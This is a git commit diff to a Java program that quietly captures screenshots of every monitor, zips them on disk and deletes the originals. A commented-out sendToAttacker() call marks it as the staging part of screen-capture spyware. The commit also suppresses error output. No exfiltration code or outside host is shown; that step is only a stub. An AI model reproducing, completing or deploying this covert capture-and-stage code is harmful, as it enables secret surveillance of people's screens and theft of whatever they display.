b933ddce175207a0200b1d1a5433010b39084c17
Tomasz Maj <tmaj.pl@gmail.com>
2016-05-23 21:56:35 +0200

    improvement for science

--- ScreenCapture/ScreenCapture.java
+++ ScreenCapture/ScreenCapture.java
@@ -13,14 +13,13 @@ import java.util.Date;
 public class ScreenCapture {
 
     private static final String PREFIX = "capture";
-    private static final String IMAGE_FORMAT = "png";
+    private static final String IMAGE_FORMAT = "jpg";
+
     private static final String FILE_PATTERN = ".+" + PREFIX + "_[0-9]+_[0-9]+\\." + IMAGE_FORMAT;
     private static final String DESTINATION = "D:\\";
-    private static final String ZIP_FILE = "packedImages.zip";
-    private static final int DEPTH = 1;
+    private static final String ZIP_FILE = PREFIX + ".zip";
+    private static final int SEARCH_DEPTH = 1;
     private static int ID = 1;
-    private Robot robot = new Robot();
-    private ZipApi zipApi = new ZipApi(DESTINATION + ZIP_FILE);
 
     public ScreenCapture() throws InterruptedException, AWTException, IOException {
         this(0);
@@ -36,7 +35,7 @@ public class ScreenCapture {
         try {
             new ScreenCapture();
         } catch (InterruptedException | IOException | AWTException e) {
-            e.printStackTrace();
+//            e.printStackTrace();
         }
     }
 
@@ -44,32 +43,33 @@ public class ScreenCapture {
         return Long.toString(new Date().getTime());
     }
 
-    private void captureAllMonitors() throws IOException {
+    private void captureAllMonitors() throws IOException, AWTException {
         GraphicsEnvironment graphicsEnvironment = GraphicsEnvironment.getLocalGraphicsEnvironment();
         GraphicsDevice[] screenDevices = graphicsEnvironment.getScreenDevices();
         iterateAllDevices(screenDevices);
     }
 
-    private void iterateAllDevices(GraphicsDevice[] screenDevices) throws IOException {
+    private void iterateAllDevices(GraphicsDevice[] screenDevices) throws IOException, AWTException {
         for (GraphicsDevice device : screenDevices) {
             iterateAllMonitors(device);
         }
     }
 
-    private void iterateAllMonitors(GraphicsDevice device) throws IOException {
+    private void iterateAllMonitors(GraphicsDevice device) throws IOException, AWTException {
         GraphicsConfiguration[] configurations = device.getConfigurations();
         for (GraphicsConfiguration monitor : configurations) {
             captureAndSave(monitor.getBounds());
         }
     }
 
-    private void captureAndSave(Rectangle bounds) throws IOException {
+    private void captureAndSave(Rectangle bounds) throws IOException, AWTException {
+        Robot robot = new Robot();
         BufferedImage image = robot.createScreenCapture(bounds);
         saveImage(image);
     }
 
     private void saveImage(BufferedImage image) throws IOException {
-        File path = new File(getFullPath());
+        File path = new File(getNewPath());
         ImageIO.write(image, IMAGE_FORMAT, path);
     }
 
@@ -78,26 +78,31 @@ public class ScreenCapture {
         return new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
     }
 
-    private String getFullPath() {
+    private String getNewPath() {
         return DESTINATION + PREFIX + "_" + getMilliseconds() + "_" + (ID++) + "." + IMAGE_FORMAT;
     }
 
     private void packAndSend() throws IOException {
         final String[] images = getCapturedImages();
-        zipApi.packFiles(images);
-        removeImages(images);
+        pack(images);
+        remove(images);
 //        sendToAttacker();
     }
 
+    private void pack(String[] images) throws IOException {
+        ZipApi zipApi = new ZipApi(DESTINATION + ZIP_FILE);
+        zipApi.pack(images);
+        zipApi.close();
+    }
+
     private String[] getCapturedImages() throws IOException {
-        return Files.walk(Paths.get(DESTINATION), DEPTH)
+        return Files.walk(Paths.get(DESTINATION), SEARCH_DEPTH)
                 .map(Path::toString)
                 .filter(s -> s.matches(FILE_PATTERN))
                 .toArray(String[]::new);
     }
 
-
-    private void removeImages(String[] images) {
+    private void remove(String[] images) {
         for (String file : images) {
             new File(file).delete();
         }
--- ScreenCapture/ZipApi.java
+++ ScreenCapture/ZipApi.java
@@ -1,51 +1,46 @@
 package it.justDo.misc;
 
-import java.io.File;
-import java.io.FileInputStream;
-import java.io.FileOutputStream;
-import java.io.IOException;
+import java.io.*;
 import java.util.zip.ZipEntry;
 import java.util.zip.ZipOutputStream;
 
 public class ZipApi {
 
-    private File destination;
+    private ZipOutputStream zipStream;
 
-    public ZipApi(String path) {
-        destination = new File(path);
+    public ZipApi(String path) throws FileNotFoundException {
+        FileOutputStream outputStream = new FileOutputStream(path);
+        zipStream = new ZipOutputStream(outputStream);
     }
 
-    public void packFiles(String[] files) throws IOException {
-        FileOutputStream fileStream = new FileOutputStream(destination);
-        try (ZipOutputStream zipStream = new ZipOutputStream(fileStream)) {
-            packAll(files, zipStream);
+    public void pack(String[] files) throws IOException {
+        for (String file : files) {
+            pack(file);
         }
     }
 
-    private void packAll(String[] images, ZipOutputStream zipStream) throws IOException {
-        for (String file : images) {
-            packSingle(zipStream, file);
-        }
-    }
-
-    private void packSingle(ZipOutputStream zipStream, String file) throws IOException {
+    public void pack(String file) throws IOException {
         try (FileInputStream inputStream = new FileInputStream(file)) {
-            createZipFile(zipStream, file, inputStream);
+            createEntry(file);
+            writeToZip(inputStream);
         }
     }
 
-    private void createZipFile(ZipOutputStream zipStream, String file, FileInputStream inputStream) throws IOException {
+    private void createEntry(String file) throws IOException {
         String name = new File(file).getName();
         ZipEntry entry = new ZipEntry(name);
         zipStream.putNextEntry(entry);
-        writeToZip(zipStream, inputStream);
     }
 
-    private void writeToZip(ZipOutputStream zipStream, FileInputStream inputStream) throws IOException {
+    private void writeToZip(FileInputStream inputStream) throws IOException {
         byte[] readBuffer = new byte[1024];
         int amountRead;
         while ((amountRead = inputStream.read(readBuffer)) > 0) {
             zipStream.write(readBuffer, 0, amountRead);
         }
+    }
+
+    public void close() throws IOException {
+        zipStream.close();
     }
 }
